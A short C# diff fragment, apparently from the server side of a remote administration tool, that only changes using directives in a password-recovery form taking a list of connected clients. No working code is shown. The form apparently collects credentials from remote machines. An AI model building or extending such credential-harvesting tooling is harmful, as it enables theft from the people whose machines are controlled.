@@ -5,18 +5,18 @@ using System.Data;
 using System.Drawing;
 using System.IO;
 using System.Linq;
+using System.Runtime.InteropServices;
 using System.Text;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.Recovery.Helper;
 using xServer.Settings;
-
+using xServer.Core.Extensions;
 namespace xServer.Forms
 {
     public partial class FrmPasswordRecovery : Form
     {
         public List<Client> ConnectedClients { get; set; }
-
         public FrmPasswordRecovery(List<Client> connectedClients)
         {
             
